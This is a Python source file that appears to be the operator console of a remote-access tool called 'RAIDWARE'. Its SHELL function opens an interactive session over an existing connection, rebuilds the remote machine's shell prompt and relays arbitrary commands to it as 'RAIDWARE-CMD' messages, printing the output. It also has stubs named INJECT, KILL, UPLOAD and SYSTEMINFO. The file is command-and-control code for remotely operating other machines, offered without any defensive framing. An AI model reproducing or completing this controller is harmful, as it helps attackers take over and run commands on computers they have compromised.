from CLI.utils.colors import log_error

class Handle:
    conn = None
    is_running = True

def EXIT(*args):
    Handle.is_running = False

def SHELL(*args):
    if Handle.conn == None:
        log_error("No connection has been established")
        return

    Handle.conn.send("RAIDWARE-INTERACT")
    buffer = Handle.conn.recv()

    ''' Printing the prompt based on OS: '''
    buffer = buffer.split('|')
    def update():
        if 'Windows' in Handle.conn.OS:
            return f"{buffer[2]}> "
        else:
            return f"{buffer[0]}@{buffer[1]}:{buffer[2]}$ "

    prompt = update()

    while True:
        try:
            cmd = input(prompt)
            if cmd == "":
                continue
            if cmd.lower() == "quit"  or cmd.lower() == "exit":
                Handle.conn.send("RAIDWARE-INTERACT-END")
                rcv = Handle.conn.recv()
                if rcv == "END-ACK":
                    break
                else:
                    log_error("Unable to close the connection. Forcefully breaking out...")
                    break

            curr = cmd.split()

            if curr[0].lower() == "put" or curr[0].lower() == "upload":
                print("UNIMPLEMENTED")
                continue

            if curr[0].lower() == "get" or curr[0].lower() == "download":
                print("UNIMPLEMENTED")
                continue

            Handle.conn.send(f"RAIDWARE-CMD {cmd}")
            rcv = Handle.conn.recv()
            if curr[0].lower() == "cd":
                if "Error" not in rcv:
                    buffer[2] = rcv
                    prompt = update()
                    continue
                else:
                    pass
                
            print(rcv)
        except KeyboardInterrupt:
            print()
            log_error("Please type \"[RED]EXIT[RESET]\" or \"[RED]QUIT[RESET]\" to break out of the shell.")
            continue
        except EOFError:
            print()
            log_error("Please type \"[RED]EXIT[RESET]\" or \"[RED]QUIT[RESET]\" to break out of the shell.")
            continue

    pass

def DOWNLOAD(*args):
    pass

def UPLOAD(*args):
    pass

def INJECT(*args):
    pass

def KILL(*args):
    pass

def SYSTEMINFO(*args):
    pass